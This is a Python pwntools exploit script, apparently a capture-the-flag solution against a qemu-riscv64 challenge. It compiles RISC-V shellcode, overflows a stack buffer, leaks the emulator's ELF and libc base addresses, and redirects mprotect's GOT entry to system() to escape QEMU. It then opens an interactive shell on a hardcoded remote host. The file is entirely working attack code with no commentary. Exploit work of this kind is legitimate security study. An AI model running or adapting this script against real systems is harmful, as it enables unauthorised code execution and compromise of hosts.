#!/usr/bin/env python
# coding: utf-8

from pwn import *

context.log_level = 'debug'

comp = process(['docker-compose', 'exec', '-T', 'tools', '/bin/sh', '-c',
				'cd /work && rm sc1.bin sc2.bin'
				+'&& riscv64-unknown-elf-gcc -e main -nostdlib shellcode1.c -o sc1 && riscv64-unknown-elf-objcopy --dump-section .text=sc1.bin sc1'
				+'&& riscv64-unknown-elf-gcc -e main -nostdlib shellcode2.c -o sc2 && riscv64-unknown-elf-objcopy --dump-section .text=sc2.bin sc2'])
comp.recvall()
comp.close()

context.log_level = 'info'

local = False

if local:
	io = process(['docker-compose', 'exec', '-T', 'pwn', '/bin/sh', '-c', 'cd /home/pwn && ./qemu-riscv64 -g 1234 main'])
	ret_addr = 0x4000800ba0
else:
	io = remote("119.28.89.167",60001)
	ret_addr = 0x4000800b48

sc1 = open('sc1.bin', 'rb').read()
sc2 = open('sc2.bin', 'rb').read()

io.sendline(b'a'*8 + sc1.ljust(280, b'a') + p64(ret_addr))
io.send(sc2)

data = io.recvuntil('[stack]')
elf_addr = 0
libc_addr = 0
for line in data.split('\n'):
	if 'r-xp' in line and '/home/pwn/qemu-riscv64' in line and not elf_addr:
		elf_addr = int(line.split('-')[0], 16)
		print('[+] ELF base: {:#x}'.format(elf_addr))
	elif 'r-xp' in line and '/lib/x86_64-linux-gnu/libc-2.27.so' in line and not libc_addr:
		libc_addr = int(line.split('-')[0], 16)
		print('[+] Libc base: {:#x}'.format(libc_addr))

if elf_addr == 0 or libc_addr == 0:
	print('[!] Failed')
	sys.exit(0)

io.send(p64(elf_addr+0x668000))	# rodata
io.send(p64(elf_addr+0x6A3200))	# mprotect got
io.send(p64(libc_addr+0x4F550))	# system addr in libc

io.interactive()
